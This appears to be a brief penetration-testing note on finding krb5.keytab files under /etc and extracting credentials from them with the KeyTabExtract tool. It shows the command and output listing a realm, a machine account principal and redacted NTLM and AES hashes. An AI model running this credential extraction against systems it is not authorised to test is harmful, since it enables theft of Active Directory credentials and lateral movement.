maybe krb5.keytab files on that path /etc

 get creds from those with this tool:
 

PS C:\Tools\KeyTabExtract> python .\keytabextract.py .\krb5.keytab

```
PS C:\Tools\KeyTabExtract> python .\keytabextract.py .\krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : AD.ABCD.COM
        SERVICE PRINCIPAL : LATL0$/
        NTLM HASH : <redacted>
        AES-256 HASH : <redacted>
        AES-128 HASH : <redacted>
```